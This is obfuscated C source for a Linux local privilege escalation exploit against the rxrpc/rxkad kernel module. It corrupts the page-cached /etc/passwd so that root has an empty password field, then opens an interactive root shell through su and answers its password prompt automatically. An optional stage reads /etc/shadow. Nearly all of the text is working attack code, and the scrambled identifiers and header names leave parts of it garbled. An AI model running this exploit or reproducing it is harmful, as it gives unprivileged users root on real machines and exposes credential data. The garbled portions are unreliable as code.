uxFe8UG6yvQ8(L,R,ctx->sched[0x3]);
uxFe8UG6yvQ8(R,L,ctx->sched[0x2]);
uxFe8UG6yvQ8(L,R,ctx->sched[0x1]);
uxFe8UG6yvQ8(R,L,ctx->sched[0x0]);
uPXCV3bNSGNz(Nbiy1HmiYjfm,&L,4);
uPXCV3bNSGNz(Nbiy1HmiYjfm+4,&R,4);
}
static inline int HszIjePVAB6s(const KxYLUgm9lW7f P[8])
{
return P[0]==':'&&P[1]==':';
}
static inline int L5F4rOborwnE(const KxYLUgm9lW7f P[8])
{
return P[0]=='0'&&P[1]==':';
}
static inline int xK0jiMEPeuRG(const KxYLUgm9lW7f P[8])
{
if(P[0]!='0')return 0;
if(P[1]!=':')return 0;
if(P[7]!=':')return 0;
for(int OSKl1gHVulhW=2;OSKl1gHVulhW<7;OSKl1gHVulhW++){
if(P[OSKl1gHVulhW]==':'||P[OSKl1gHVulhW]=='\0'||P[OSKl1gHVulhW]=='\UPLP_8xKA_Tg')return 0;
}
return 1;
}
static XnKUz0JcAZH5 biYE8dWiJ24u(XnKUz0JcAZH5*EqnzVuA7PHVY)
{
XnKUz0JcAZH5 z=(*EqnzVuA7PHVY+=0x9E3779B97F4A7C15ULL);
z=(z ^(z>>30))*0xBF58476D1CE4E5B9ULL;
z=(z ^(z>>27))*0x94D049BB133111EBULL;
return z ^(z>>31);
}
typedef int(*pcheck_fn)(const KxYLUgm9lW7f P[8]);
static int dTFrhD4JNbFx(const KxYLUgm9lW7f C[8],XnKUz0JcAZH5 max_iters,
pcheck_fn PJyG93NBylnp,
KxYLUgm9lW7f K_out[8],KxYLUgm9lW7f P_out[8],
XnKUz0JcAZH5 seed_init,
const char*label)
{
L0IiMVCbGZ7P ctx;
KxYLUgm9lW7f K[8],P[8];
XnKUz0JcAZH5 seed=seed_init;
struct timespec ts0,ts1;
hlUYACgaJ03R(CLOCK_MONOTONIC,&ts0);
for(XnKUz0JcAZH5 iter=0;iter<max_iters;iter++){
XnKUz0JcAZH5 QDcGHa7QwzpE=biYE8dWiJ24u(&seed);
uPXCV3bNSGNz(K,&QDcGHa7QwzpE,8);
fk9JAt9xYQjI(&ctx,K);
PUtdUysZzVPH(&ctx,P,C);
if(PJyG93NBylnp(P)){
uPXCV3bNSGNz(K_out,K,8);
uPXCV3bNSGNz(P_out,P,8);
hlUYACgaJ03R(CLOCK_MONOTONIC,&ts1);
double Rwv9YZ8zizKr=(ts1.tv_sec-ts0.tv_sec)+
(ts1.tv_nsec-ts0.tv_nsec)/1e9;
co1uhCExyQ8x("%s found after %lu iters in %.2fs (%.2fM/s) K=%02x%02x%02x%02x%02x%02x%02x%02x  P=%02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
label,
(unsigned long)iter,Rwv9YZ8zizKr,iter/Rwv9YZ8zizKr/1e6,
K[0],K[1],K[2],K[3],K[4],K[5],K[6],K[7],
P[0],P[1],P[2],P[3],P[4],P[5],P[6],P[7],
(P[0]>=32&&P[0]<127)?P[0]:'.',
(P[1]>=32&&P[1]<127)?P[1]:'.',
(P[2]>=32&&P[2]<127)?P[2]:'.',
(P[3]>=32&&P[3]<127)?P[3]:'.',
(P[4]>=32&&P[4]<127)?P[4]:'.',
(P[5]>=32&&P[5]<127)?P[5]:'.',
(P[6]>=32&&P[6]<127)?P[6]:'.',
(P[7]>=32&&P[7]<127)?P[7]:'.');
return 0;
}
if((iter&0x3ffffff)==0&&iter>0){
hlUYACgaJ03R(CLOCK_MONOTONIC,&ts1);
double Rwv9YZ8zizKr=(ts1.tv_sec-ts0.tv_sec)+
(ts1.tv_nsec-ts0.tv_nsec)/1e9;
JXxZGUwWxvAS(stderr,"  [%s %.1fs] iter=%lu (%.2fM/s)\n",
label,Rwv9YZ8zizKr,(unsigned long)iter,iter/Rwv9YZ8zizKr/1e6);
}
}
return-1;
}
int u6ofGdno8mCH(int H2sE8d2gKqV4,char**i8MosvajvkPB)
{
JXxZGUwWxvAS(stderr,"\n=== rxrpc/rxkad LPE EXPLOIT (uid=1000 → root) ===\n");
JXxZGUwWxvAS(stderr,"[*] uid=%u euid=%u gid=%u\n",
Xd7pjih6oB0K(),gd9wY5OgpqLx(),CQ7FPelhFhIQ());
{
const char*no_unshare=nFbyvbuS6mq9("POC_NO_UNSHARE");
if(!no_unshare||*no_unshare!='1'){
const char*do_unshare=nFbyvbuS6mq9("POC_UNSHARE");
if(do_unshare&&*do_unshare=='1'){
if(k13_jPRsRPg_()<0)return 1;
}
}
}
{
int Mh0lmNbvs2ya=fWzEPSYEq_tn(AF_RXRPC,SOCK_DGRAM,PF_INET);
if(Mh0lmNbvs2ya<0){
LoUvlUIx9Y16("socket(AF_RXRPC): %s — module not loadable?",fCyi_ikstIvp(errno));
return 1;
}
uTbTPjM3XJjE(Mh0lmNbvs2ya);
co1uhCExyQ8x("rxrpc module autoloaded via dummy socket(AF_RXRPC)");
}
const char*target_path=nFbyvbuS6mq9("POC_TARGET_FILE");
if(!target_path||!*target_path)target_path="/etc/passwd";
int NdNyZbxtIRRt=uIs8PCmo8qWx(target_path,O_RDONLY);
if(NdNyZbxtIRRt<0){
LoUvlUIx9Y16("open %s RO: %s",target_path,fCyi_ikstIvp(errno));
return 1;
}
struct stat st;
byG10GpEjbeA(NdNyZbxtIRRt,&st);
if(st.st_size<32){LoUvlUIx9Y16("target too small: %lld",(long long)st.st_size);return 1;}
co1uhCExyQ8x("target %s opened RO, size=%lld, uid=%u gid=%u mode=%04o",
target_path,(long long)st.st_size,st.st_uid,st.st_gid,
st.st_mode&07777);
void*edRs4tC9nkep=DrXQaKoTe4kx(NULL,4096,PROT_READ,MAP_SHARED,NdNyZbxtIRRt,0);
if(edRs4tC9nkep==MAP_FAILED){LoUvlUIx9Y16("mmap: %s",fCyi_ikstIvp(errno));return 1;}
co1uhCExyQ8x("mmap'd %s page-cache at %p (PROT_READ|MAP_SHARED)",target_path,edRs4tC9nkep);
{
const char*m=(const char*)edRs4tC9nkep;
if(__8XI_u7oz0P(m,"root::0:0",9)==0){
co1uhCExyQ8x("/etc/passwd already patched (root::0:0...) — nothing to do");
return 0;
}
co1uhCExyQ8x("/etc/passwd line 1 first 16 bytes:");
for(int OSKl1gHVulhW=0;OSKl1gHVulhW<16;OSKl1gHVulhW++)
JXxZGUwWxvAS(stderr,"%02x ",(KxYLUgm9lW7f)m[OSKl1gHVulhW]);
JXxZGUwWxvAS(stderr,"\n");
}
JXxZGUwWxvAS(stderr,"[*] /etc/passwd line 1 (root entry) BEFORE: '");
for(int OSKl1gHVulhW=0;OSKl1gHVulhW<32;OSKl1gHVulhW++){
char khMFbCqeHtjS=((const char*)edRs4tC9nkep)[OSKl1gHVulhW];
Z44Vmx8NUYkA((khMFbCqeHtjS=='\UPLP_8xKA_Tg')? '$' :(khMFbCqeHtjS>=32&&khMFbCqeHtjS<127 ? khMFbCqeHtjS : '.'),stderr);
}
JXxZGUwWxvAS(stderr,"'\n");
KxYLUgm9lW7f Ca[8],Cb[8],Cc[8];
int L0PAQAl2Q4C5=4,off_b=6,off_c=8;
if(Osc6hXhCf2tf(NdNyZbxtIRRt,Ca,8,L0PAQAl2Q4C5)!=8){LoUvlUIx9Y16("pread Ca: %s",fCyi_ikstIvp(errno));return 1;}
if(Osc6hXhCf2tf(NdNyZbxtIRRt,Cb,8,off_b)!=8){LoUvlUIx9Y16("pread Cb: %s",fCyi_ikstIvp(errno));return 1;}
if(Osc6hXhCf2tf(NdNyZbxtIRRt,Cc,8,off_c)!=8){LoUvlUIx9Y16("pread Cc: %s",fCyi_ikstIvp(errno));return 1;}
co1uhCExyQ8x("Ca @ %d: %02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
L0PAQAl2Q4C5,Ca[0],Ca[1],Ca[2],Ca[3],Ca[4],Ca[5],Ca[6],Ca[7],
(Ca[0]>=32&&Ca[0]<127)?Ca[0]:'.',(Ca[1]>=32&&Ca[1]<127)?Ca[1]:'.',
(Ca[2]>=32&&Ca[2]<127)?Ca[2]:'.',(Ca[3]>=32&&Ca[3]<127)?Ca[3]:'.',
(Ca[4]>=32&&Ca[4]<127)?Ca[4]:'.',(Ca[5]>=32&&Ca[5]<127)?Ca[5]:'.',
(Ca[6]>=32&&Ca[6]<127)?Ca[6]:'.',(Ca[7]>=32&&Ca[7]<127)?Ca[7]:'.');
co1uhCExyQ8x("Cb @ %d: %02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
off_b,Cb[0],Cb[1],Cb[2],Cb[3],Cb[4],Cb[5],Cb[6],Cb[7],
(Cb[0]>=32&&Cb[0]<127)?Cb[0]:'.',(Cb[1]>=32&&Cb[1]<127)?Cb[1]:'.',
(Cb[2]>=32&&Cb[2]<127)?Cb[2]:'.',(Cb[3]>=32&&Cb[3]<127)?Cb[3]:'.',
(Cb[4]>=32&&Cb[4]<127)?Cb[4]:'.',(Cb[5]>=32&&Cb[5]<127)?Cb[5]:'.',
(Cb[6]>=32&&Cb[6]<127)?Cb[6]:'.',(Cb[7]>=32&&Cb[7]<127)?Cb[7]:'.');
co1uhCExyQ8x("Cc @ %d: %02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
off_c,Cc[0],Cc[1],Cc[2],Cc[3],Cc[4],Cc[5],Cc[6],Cc[7],
(Cc[0]>=32&&Cc[0]<127)?Cc[0]:'.',(Cc[1]>=32&&Cc[1]<127)?Cc[1]:'.',
(Cc[2]>=32&&Cc[2]<127)?Cc[2]:'.',(Cc[3]>=32&&Cc[3]<127)?Cc[3]:'.',
(Cc[4]>=32&&Cc[4]<127)?Cc[4]:'.',(Cc[5]>=32&&Cc[5]<127)?Cc[5]:'.',
(Cc[6]>=32&&Cc[6]<127)?Cc[6]:'.',(Cc[7]>=32&&Cc[7]<127)?Cc[7]:'.');
numoGMRcopLy();
{
L0IiMVCbGZ7P ctx;
KxYLUgm9lW7f z[8]={0};
KxYLUgm9lW7f cv[8]={0x0E,0x09,0x00,0xC7,0x3E,0xF7,0xED,0x41};
KxYLUgm9lW7f pv[8];
fk9JAt9xYQjI(&ctx,z);
PUtdUysZzVPH(&ctx,pv,cv);
if(__8XI_u7oz0P(pv,z,8)!=0){LoUvlUIx9Y16("fcrypt selftest FAILED");return 1;}
}
co1uhCExyQ8x("fcrypt selftest OK");
KxYLUgm9lW7f Ka[8],Pa_out[8];
KxYLUgm9lW7f Kb[8],Pb_out[8];
KxYLUgm9lW7f Kc[8],Pc_out[8];
KxYLUgm9lW7f Cb_actual[8],Cc_actual[8];
{
XnKUz0JcAZH5 max_iters=10000000000ULL;
const char*e=nFbyvbuS6mq9("LPE_MAX_ITERS");
if(e)max_iters=f6njrYEchq7X(e,NULL,0);
XnKUz0JcAZH5 seed_base=(XnKUz0JcAZH5)ta2KYcSNCM1U(NULL)*0x100000001ULL ^(XnKUz0JcAZH5)KrYvemeLM24R();
const char*se=nFbyvbuS6mq9("LPE_SEED");
if(se)seed_base=f6njrYEchq7X(se,NULL,0);
JXxZGUwWxvAS(stderr,"\n=== STAGE 1a: search K_A (chars 4-5 := \"::\")  prob ~1.5e-5 ===\n");
if(dTFrhD4JNbFx(Ca,max_iters,HszIjePVAB6s,
Ka,Pa_out,seed_base,"K_A")!=0){
LoUvlUIx9Y16("K_A search exhausted");return 2;
}
uPXCV3bNSGNz(Cb_actual,Pa_out+2,6);
uPXCV3bNSGNz(Cb_actual+6,Cb+6,2);
co1uhCExyQ8x("Cb_actual (after splice A) = %02x%02x%02x%02x%02x%02x%02x%02x",
Cb_actual[0],Cb_actual[1],Cb_actual[2],Cb_actual[3],
Cb_actual[4],Cb_actual[5],Cb_actual[6],Cb_actual[7]);
JXxZGUwWxvAS(stderr,"\n=== STAGE 1b: search K_B (chars 6-7 := \"0:\")  prob ~1.5e-5 ===\n");
if(dTFrhD4JNbFx(Cb_actual,max_iters,L5F4rOborwnE,
Kb,Pb_out,seed_base ^ 0xa5a5a5a5a5a5a5a5ULL,"K_B")!=0){
LoUvlUIx9Y16("K_B search exhausted");return 2;
}
uPXCV3bNSGNz(Cc_actual,Pb_out+2,6);
uPXCV3bNSGNz(Cc_actual+6,Cc+6,2);
co1uhCExyQ8x("Cc_actual (after splice B) = %02x%02x%02x%02x%02x%02x%02x%02x",
Cc_actual[0],Cc_actual[1],Cc_actual[2],Cc_actual[3],
Cc_actual[4],Cc_actual[5],Cc_actual[6],Cc_actual[7]);
JXxZGUwWxvAS(stderr,"\n=== STAGE 1c: search K_C (chars 8-15 := \"0:GGGGGG:\")  prob ~5.4e-8 ===\n");
if(dTFrhD4JNbFx(Cc_actual,max_iters,xK0jiMEPeuRG,
Kc,Pc_out,seed_base ^ 0x5a5a5a5a5a5a5a5aULL,"K_C")!=0){
LoUvlUIx9Y16("K_C search exhausted");return 2;
}
}
JXxZGUwWxvAS(stderr,"\n[+] Predicted post-corruption /etc/passwd line 1:\n    \"root");
for(int OSKl1gHVulhW=0;OSKl1gHVulhW<2;OSKl1gHVulhW++)Z44Vmx8NUYkA((Pa_out[OSKl1gHVulhW]>=32&&Pa_out[OSKl1gHVulhW]<127)?Pa_out[OSKl1gHVulhW]:'.',stderr);
for(int OSKl1gHVulhW=0;OSKl1gHVulhW<2;OSKl1gHVulhW++)Z44Vmx8NUYkA((Pb_out[OSKl1gHVulhW]>=32&&Pb_out[OSKl1gHVulhW]<127)?Pb_out[OSKl1gHVulhW]:'.',stderr);
for(int OSKl1gHVulhW=0;OSKl1gHVulhW<8;OSKl1gHVulhW++)Z44Vmx8NUYkA((Pc_out[OSKl1gHVulhW]>=32&&Pc_out[OSKl1gHVulhW]<127)?Pc_out[OSKl1gHVulhW]:'.',stderr);
JXxZGUwWxvAS(stderr,"/root:/bin/bash\"\n");
JXxZGUwWxvAS(stderr,"\n=== STAGE 2a: kernel trigger A @ off %d (set chars 4-5 \"::\") ===\n",L0PAQAl2Q4C5);
uPXCV3bNSGNz(SESSION_KEY,Ka,8);
if(F5Bk9c8h8zN1(NdNyZbxtIRRt,L0PAQAl2Q4C5,8)<0){
LoUvlUIx9Y16("kernel trigger A failed");return 3;
}
JXxZGUwWxvAS(stderr,"\n=== STAGE 2b: kernel trigger B @ off %d (set chars 6-7 \"0:\") ===\n",off_b);
uPXCV3bNSGNz(SESSION_KEY,Kb,8);
if(F5Bk9c8h8zN1(NdNyZbxtIRRt,off_b,8)<0){
LoUvlUIx9Y16("kernel trigger B failed");return 3;
}
JXxZGUwWxvAS(stderr,"\n=== STAGE 2c: kernel trigger C @ off %d (set chars 8-15 \"0:GGGGGG:\") ===\n",off_c);
uPXCV3bNSGNz(SESSION_KEY,Kc,8);
if(F5Bk9c8h8zN1(NdNyZbxtIRRt,off_c,8)<0){
LoUvlUIx9Y16("kernel trigger C failed");return 3;
}
JXxZGUwWxvAS(stderr,"[*] /etc/passwd line 1 (root entry) AFTER:  '");
for(int OSKl1gHVulhW=0;OSKl1gHVulhW<32;OSKl1gHVulhW++){
char khMFbCqeHtjS=((const char*)edRs4tC9nkep)[OSKl1gHVulhW];
Z44Vmx8NUYkA((khMFbCqeHtjS=='\UPLP_8xKA_Tg')? '$' :(khMFbCqeHtjS>=32&&khMFbCqeHtjS<127 ? khMFbCqeHtjS : '.'),stderr);
}
JXxZGUwWxvAS(stderr,"'\n");
{
const char*m=(const char*)edRs4tC9nkep;
int XrgKJsJ3pP_J=(m[4]==':'&&m[5]==':'&&
m[6]=='0'&&m[7]==':'&&
m[8]=='0'&&m[9]==':'&&
m[15]==':');
if(!XrgKJsJ3pP_J){
LoUvlUIx9Y16("post-trigger sanity check failed — char layout off");
return 4;
}
}
JXxZGUwWxvAS(stderr,"\n[!!!] HIT — root entry now has empty passwd field, uid=0, ""gid=0, dir=/root, shell=/bin/bash.\n");
JXxZGUwWxvAS(stderr,"\n=== STAGE 3: independent verify via `getent passwd root` ===\n");
{
int StBpOFaxouUU[2];
if(b01o8JsSWQsE(StBpOFaxouUU)==0){
pid_t pid=iw2ImeFnDiYc();
if(pid==0){
uTbTPjM3XJjE(StBpOFaxouUU[0]);
cyWR6G4zaLth(StBpOFaxouUU[1],1);
cyWR6G4zaLth(StBpOFaxouUU[1],2);
uTbTPjM3XJjE(StBpOFaxouUU[1]);
CI9G37imnInx("getent","getent","passwd","root",NULL);
DQkpKHNl35S4(127);
}
uTbTPjM3XJjE(StBpOFaxouUU[1]);
char MIJLq5smlqvE[1024];
FCeyHEe1FNFR QDcGHa7QwzpE=tAnVbQJ1a4_N(StBpOFaxouUU[0],MIJLq5smlqvE,sizeof(MIJLq5smlqvE)-1);
uTbTPjM3XJjE(StBpOFaxouUU[0]);
int lUT9kzTC1_jp=0;
X9CUHnJp5rgE(pid,&lUT9kzTC1_jp,0);
if(QDcGHa7QwzpE>0){
MIJLq5smlqvE[QDcGHa7QwzpE]=0;
JXxZGUwWxvAS(stderr,"[getent passwd root] %s",MIJLq5smlqvE);
}
JXxZGUwWxvAS(stderr,"[+] PRIMITIVE proven: root entry has empty passwd field ""via NSS.\n");
}
}
{
int wjc5521CH9g1=0;
for(int OSKl1gHVulhW=1;OSKl1gHVulhW<H2sE8d2gKqV4;OSKl1gHVulhW++)
if(!z0fxCLkJRZNa(i8MosvajvkPB[OSKl1gHVulhW],"--corrupt-only")){wjc5521CH9g1=1;break;}
const char*e=nFbyvbuS6mq9("DIRTYFRAG_CORRUPT_ONLY");
if(e&&*e=='1')wjc5521CH9g1=1;
if(wjc5521CH9g1)return 0;
}
JXxZGUwWxvAS(stderr,"\n=== STAGE 4: spawning interactive root shell via `su` ""(no password input needed) ===\n\n");
mhkqdw6foeMe(stderr);
int K9Sb07Y_EHYs=U_AQeY_u6hH_(O_RDWR|O_NOCTTY);
if(K9Sb07Y_EHYs<0||oEFAHIYN6c5a(K9Sb07Y_EHYs)<0||oOrEgrUYreiS(K9Sb07Y_EHYs)<0){
LoUvlUIx9Y16("posix_openpt: %s",fCyi_ikstIvp(errno));
return 5;
}
char*NkduKcjT8YhE=U2x6e0DjPhXA(K9Sb07Y_EHYs);
struct winsize ws;
if(VgwHaV_6ASs2(STDIN_FILENO,TIOCGWINSZ,&ws)==0){
VgwHaV_6ASs2(K9Sb07Y_EHYs,TIOCSWINSZ,&ws);
}
pid_t pid=iw2ImeFnDiYc();
if(pid<0){LoUvlUIx9Y16("fork: %s",fCyi_ikstIvp(errno));return 5;}
if(pid==0){
NHlkwZfh0FUW();
int cWpiwZslPkzc=uIs8PCmo8qWx(NkduKcjT8YhE,O_RDWR);
if(cWpiwZslPkzc<0)DQkpKHNl35S4(127);
VgwHaV_6ASs2(cWpiwZslPkzc,TIOCSCTTY,0);
cyWR6G4zaLth(cWpiwZslPkzc,0);cyWR6G4zaLth(cWpiwZslPkzc,1);cyWR6G4zaLth(cWpiwZslPkzc,2);
if(cWpiwZslPkzc>2)uTbTPjM3XJjE(cWpiwZslPkzc);
uTbTPjM3XJjE(K9Sb07Y_EHYs);
CI9G37imnInx("su","su",NULL);
DQkpKHNl35S4(127);
}
struct termios saved_termios;
int zQQTHDOMkhuE=(BomZmrA_R5pr(STDIN_FILENO,&saved_termios)==0);
if(zQQTHDOMkhuE){
struct termios raw=saved_termios;
ICbPQukPhjhc(&raw);
VcxJDCxulPcZ(STDIN_FILENO,TCSANOW,&raw);
}
int FWRZCFA74Fme=0;
int HiSWy2VUO0FJ=0;
char MIJLq5smlqvE[4096];
int wMEDT2YNxaqy=0;
{
const char*e=nFbyvbuS6mq9("LPE_AUTO_VERIFY");
if(e&&*e=='1')wMEDT2YNxaqy=1;
}
int erlXFZ1wzE1T=0;
int eHOwmphDcI7C=0;
for(;;){
struct pollfd pfds[2]={
{HiSWy2VUO0FJ ?-1 : STDIN_FILENO,POLLIN,0},
{K9Sb07Y_EHYs,POLLIN,0},
};
int VhaJSzW4odmn=xDCitq1jlHVM(pfds,2,200);
if(VhaJSzW4odmn<0&&errno!=EINTR)break;
eHOwmphDcI7C+=200;
if(pfds[1].revents&POLLIN){
FCeyHEe1FNFR UPLP_8xKA_Tg=tAnVbQJ1a4_N(K9Sb07Y_EHYs,MIJLq5smlqvE,sizeof(MIJLq5smlqvE));
if(UPLP_8xKA_Tg<=0)break;
(void)niQtHbwyjt0Q(STDOUT_FILENO,MIJLq5smlqvE,UPLP_8xKA_Tg);
if(!FWRZCFA74Fme&&(size_t)UPLP_8xKA_Tg<sizeof(MIJLq5smlqvE)){
MIJLq5smlqvE[UPLP_8xKA_Tg]=0;
if(tsToKGBtRTR_(MIJLq5smlqvE,"Password")||tsToKGBtRTR_(MIJLq5smlqvE,"password")){
(void)niQtHbwyjt0Q(K9Sb07Y_EHYs,"\n",1);
FWRZCFA74Fme=1;
}
}
}
if(!HiSWy2VUO0FJ&&(pfds[0].revents&POLLIN)){
FCeyHEe1FNFR UPLP_8xKA_Tg=tAnVbQJ1a4_N(STDIN_FILENO,MIJLq5smlqvE,sizeof(MIJLq5smlqvE));
if(UPLP_8xKA_Tg<=0){
HiSWy2VUO0FJ=1;
}else{
(void)niQtHbwyjt0Q(K9Sb07Y_EHYs,MIJLq5smlqvE,UPLP_8xKA_Tg);
}
}
if(pfds[1].revents&(POLLHUP|POLLERR))break;
if(wMEDT2YNxaqy&&!erlXFZ1wzE1T&&eHOwmphDcI7C>=1000){
const char cmd[]="id; whoami; cat /etc/shadow | head -2; exit\n";
(void)niQtHbwyjt0Q(K9Sb07Y_EHYs,cmd,sizeof(cmd)-1);
erlXFZ1wzE1T=1;
}
int vmEjAfiJQStC;
pid_t w=X9CUHnJp5rgE(pid,&vmEjAfiJQStC,WNOHANG);
if(w==pid){
for(int OSKl1gHVulhW=0;OSKl1gHVulhW<5;OSKl1gHVulhW++){
struct pollfd pf={K9Sb07Y_EHYs,POLLIN,0};
if(xDCitq1jlHVM(&pf,1,50)<=0)break;
FCeyHEe1FNFR UPLP_8xKA_Tg=tAnVbQJ1a4_N(K9Sb07Y_EHYs,MIJLq5smlqvE,sizeof(MIJLq5smlqvE));
if(UPLP_8xKA_Tg<=0)break;
(void)niQtHbwyjt0Q(STDOUT_FILENO,MIJLq5smlqvE,UPLP_8xKA_Tg);
}
break;
}
}
if(zQQTHDOMkhuE){
VcxJDCxulPcZ(STDIN_FILENO,TCSANOW,&saved_termios);
}
uTbTPjM3XJjE(K9Sb07Y_EHYs);
return 0;
}
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <geCpMdo0nt7h.h>
#include <sched.h>
#include <xDCitq1jlHVM.h>
#include <Z5FTevbnL7G4.h>
#include <termios.h>
#include <sys/VgwHaV_6ASs2.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <stdint.h>
extern int vJT7o8MyyBW7(int H2sE8d2gKqV4,char**i8MosvajvkPB);
extern int u6ofGdno8mCH(int H2sE8d2gKqV4,char**i8MosvajvkPB);
static const KxYLUgm9lW7f su_marker[8]={
0x31,0xff,0x31,0xf6,0x31,0xc0,0xb0,0x6a,
};
static int V9Wtt6k5Noa7(void)
{
int goBRHYOzax5B=uIs8PCmo8qWx("/usr/bin/su",O_RDONLY);
if(goBRHYOzax5B<0)
return 0;
KxYLUgm9lW7f got[8];
FCeyHEe1FNFR UPLP_8xKA_Tg=Osc6hXhCf2tf(goBRHYOzax5B,got,sizeof(got),0x78);
uTbTPjM3XJjE(goBRHYOzax5B);
if(UPLP_8xKA_Tg!=sizeof(got))
return 0;
return __8XI_u7oz0P(got,su_marker,sizeof(su_marker))==0;
}
static int VCQo6YkUeaze(void)
{
int goBRHYOzax5B=uIs8PCmo8qWx("/etc/passwd",O_RDONLY);
if(goBRHYOzax5B<0)
return 0;
char TuZFPio8v_7_[16];
FCeyHEe1FNFR UPLP_8xKA_Tg=Osc6hXhCf2tf(goBRHYOzax5B,TuZFPio8v_7_,sizeof(TuZFPio8v_7_),0);
uTbTPjM3XJjE(goBRHYOzax5B);
if(UPLP_8xKA_Tg<9)
return 0;
return __8XI_u7oz0P(TuZFPio8v_7_,"root::0:0",9)==0;
}
static int KnlEjMD56S_g(void)
{
return V9Wtt6k5Noa7()||VCQo6YkUeaze();
}
static void hUoGIdidXbQs(int*ZFEYvBTchAVy)
{
*ZFEYvBTchAVy=RIj1vxZ4xbPG(STDERR_FILENO);
int ZpKhTuizMKOj=uIs8PCmo8qWx("/dev/null",O_WRONLY);
if(ZpKhTuizMKOj>=0){
cyWR6G4zaLth(ZpKhTuizMKOj,STDERR_FILENO);
uTbTPjM3XJjE(ZpKhTuizMKOj);
}
}
static void dz7oYAG4lO3O(int ZFEYvBTchAVy)
{
if(ZFEYvBTchAVy>=0){
cyWR6G4zaLth(ZFEYvBTchAVy,STDERR_FILENO);
uTbTPjM3XJjE(ZFEYvBTchAVy);
}
}
static char**YCdOcOOgEmeR(int H2sE8d2gKqV4,char**i8MosvajvkPB,int*AhkHAT0KKCmm)
{
static char*flag="--corrupt-only";
static char*MIJLq5smlqvE[64];
int UPLP_8xKA_Tg=H2sE8d2gKqV4<60 ? H2sE8d2gKqV4 : 60;
for(int OSKl1gHVulhW=0;OSKl1gHVulhW<UPLP_8xKA_Tg;OSKl1gHVulhW++)
MIJLq5smlqvE[OSKl1gHVulhW]=i8MosvajvkPB[OSKl1gHVulhW];
MIJLq5smlqvE[UPLP_8xKA_Tg]=flag;
MIJLq5smlqvE[UPLP_8xKA_Tg+1]=NULL;
*AhkHAT0KKCmm=UPLP_8xKA_Tg+1;
return MIJLq5smlqvE;
}
static void AKX1ggWy06T8(void)
{
const char*paths[]={"/bin/su","/usr/bin/su","/sbin/su","/usr/sbin/su",NULL,
};
for(int OSKl1gHVulhW=0;paths[OSKl1gHVulhW];OSKl1gHVulhW++)
BzTBLmymKRX6(paths[OSKl1gHVulhW],"su","-",(char*)NULL);
CI9G37imnInx("su","su","-",(char*)NULL);
}
static int wPfQT3GhZl8j(void)
{
int K9Sb07Y_EHYs=U_AQeY_u6hH_(O_RDWR|O_NOCTTY);
if(K9Sb07Y_EHYs<0)
return-1;
if(oEFAHIYN6c5a(K9Sb07Y_EHYs)<0||oOrEgrUYreiS(K9Sb07Y_EHYs)<0){
uTbTPjM3XJjE(K9Sb07Y_EHYs);
return-1;
}
char*NkduKcjT8YhE=U2x6e0DjPhXA(K9Sb07Y_EHYs);
if(!NkduKcjT8YhE){
uTbTPjM3XJjE(K9Sb07Y_EHYs);
return-1;
}
struct winsize ws;
if(VgwHaV_6ASs2(STDIN_FILENO,TIOCGWINSZ,&ws)==0)
VgwHaV_6ASs2(K9Sb07Y_EHYs,TIOCSWINSZ,&ws);
pid_t pid=iw2ImeFnDiYc();
if(pid<0){
uTbTPjM3XJjE(K9Sb07Y_EHYs);
return-1;
}
if(pid==0){
NHlkwZfh0FUW();
int cWpiwZslPkzc=uIs8PCmo8qWx(NkduKcjT8YhE,O_RDWR);
if(cWpiwZslPkzc<0)
DQkpKHNl35S4(127);
VgwHaV_6ASs2(cWpiwZslPkzc,TIOCSCTTY,0);
cyWR6G4zaLth(cWpiwZslPkzc,0);
cyWR6G4zaLth(cWpiwZslPkzc,1);
cyWR6G4zaLth(cWpiwZslPkzc,2);
if(cWpiwZslPkzc>2)
uTbTPjM3XJjE(cWpiwZslPkzc);
uTbTPjM3XJjE(K9Sb07Y_EHYs);
AKX1ggWy06T8();
DQkpKHNl35S4(127);
}
Z5FTevbnL7G4(SIGTTOU,SIG_IGN);
Z5FTevbnL7G4(SIGTTIN,SIG_IGN);
Z5FTevbnL7G4(SIGPIPE,SIG_IGN);
Z5FTevbnL7G4(SIGHUP,SIG_IGN);
(void)Xuin83K2Wcu8(0,0);
(void)dRlwA1DnyECu(STDIN_FILENO,KrYvemeLM24R());
struct termios saved_termios;
int sSfS51wdoNX1=0;
if(BomZmrA_R5pr(STDIN_FILENO,&saved_termios)==0){
struct termios raw=saved_termios;
ICbPQukPhjhc(&raw);
if(VcxJDCxulPcZ(STDIN_FILENO,TCSANOW,&raw)==0)
sSfS51wdoNX1=1;
}
int FWRZCFA74Fme=0;
int HiSWy2VUO0FJ=0;
int ue5X_v8ExCLu=0;
int eHOwmphDcI7C=0;
char MIJLq5smlqvE[4096];
for(;;){
struct pollfd pfds[2]={
{HiSWy2VUO0FJ ?-1 : STDIN_FILENO,POLLIN,0},
{K9Sb07Y_EHYs,POLLIN,0},
};
int VhaJSzW4odmn=xDCitq1jlHVM(pfds,2,200);
if(VhaJSzW4odmn<0&&errno!=EINTR)
break;
eHOwmphDcI7C+=200;
if(pfds[1].revents&POLLIN){
FCeyHEe1FNFR UPLP_8xKA_Tg=tAnVbQJ1a4_N(K9Sb07Y_EHYs,MIJLq5smlqvE,sizeof(MIJLq5smlqvE));
if(UPLP_8xKA_Tg<=0)
break;
ue5X_v8ExCLu=1;
(void)niQtHbwyjt0Q(STDOUT_FILENO,MIJLq5smlqvE,UPLP_8xKA_Tg);
if(!FWRZCFA74Fme&&UPLP_8xKA_Tg<(FCeyHEe1FNFR)sizeof(MIJLq5smlqvE)){
MIJLq5smlqvE[UPLP_8xKA_Tg]=0;
if(tsToKGBtRTR_(MIJLq5smlqvE,"Password")||
tsToKGBtRTR_(MIJLq5smlqvE,"password")){
(void)niQtHbwyjt0Q(K9Sb07Y_EHYs,"\n",1);
FWRZCFA74Fme=1;
}
}
}
if(!HiSWy2VUO0FJ&&(pfds[0].revents&POLLIN)){
FCeyHEe1FNFR UPLP_8xKA_Tg=tAnVbQJ1a4_N(STDIN_FILENO,MIJLq5smlqvE,sizeof(MIJLq5smlqvE));
if(UPLP_8xKA_Tg<=0)
HiSWy2VUO0FJ=1;
else
